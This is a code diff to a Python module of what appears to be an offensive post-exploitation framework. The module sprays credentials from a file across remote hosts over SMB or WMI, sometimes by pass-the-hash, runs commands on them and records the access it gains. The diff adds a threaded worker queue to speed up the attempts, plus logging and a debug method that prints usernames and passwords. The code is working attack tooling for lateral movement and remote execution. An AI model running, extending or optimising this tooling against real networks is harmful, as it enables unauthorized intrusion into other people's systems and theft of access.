@@ -3,6 +3,10 @@ from lib.common.smbmap import SMBMap
 from lib.common.wmiexec import WMIEXEC
 from time import sleep
 
+from Queue import Queue
+from threading import Thread
+from subprocess import Popen
+
 import threading
 
 class Module:
@@ -75,6 +79,11 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   'default'
             },
+            'threads' : {
+                'Description'   :   'Number of Python threads to execute with',
+                'Required'      :   False,
+                'Value'         :   '1'
+            },
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -94,7 +103,11 @@ class Module:
                 return False
         return True
 
+    def test_thread(self, host, username, password, domain):
+        print host, username, password, domain
+
     def attempt_deploy(self, host, username, password, domain):
+        info("Thread starting: {}".format(host))
         smb = SMBMap()
         pass_the_hash = False
 
@@ -135,7 +148,7 @@ class Module:
                 access = ''
                 if method.lower() == 'smb':
                     result = smb.exec_command(host, share, command, False, execute_only=True)
-                    if 'ACCESS_DENIED' in str(result):
+                    if 'ACCESS_DENIED' in str(result).upper():
                         output("Failed execution: {}".format(conn_info))
                         access = 'Guest'
                     else:
@@ -152,7 +165,9 @@ class Module:
             info('Failed authentication: {}'.format(conn_info))
             access = 'None'
 
+        info("Adding target")
         self.mainMenu.targets.add_target(target=host, username=username, password=password, domain=domain, access=access)
+        info("Thread done: {}".format(host))
 
     def execute(self):
         if not self.validate_options():
@@ -163,6 +178,7 @@ class Module:
         domain = self.options['domain']['Value']
         userpassFile = self.options['userpassFile']['Value']
         rhosts = self.options['rhosts']['Value']
+        threads = int(self.options['threads']['Value'])
 
         creds = []
 
@@ -193,15 +209,26 @@ class Module:
 
         try:
             args = []
-            threads = []
+
+            def do_thread(q):
+                while True:
+                    creds = q.get()
+                    self.attempt_deploy(*creds)
+                    q.task_done()
+            
+            q = Queue(maxsize=0)
+            num_threads = threads
+            
+            for i in range(num_threads):
+                worker = Thread(target=do_thread, args=(q,))
+                worker.start()
+            
             for username, password in creds:
                 for host in rhosts:
-                    t = threading.Thread(target=self.attempt_deploy, args=(host, username, password, domain))
-                    threads.append(t)
-                    t.start()
+                    q.put((host, username, password, domain))
 
             info("Waiting for all threads to finish")
-            while threading.active_count() > 1:
-                sleep(1)
+            q.join()
+
         except:
             import traceback; traceback.print_exc()
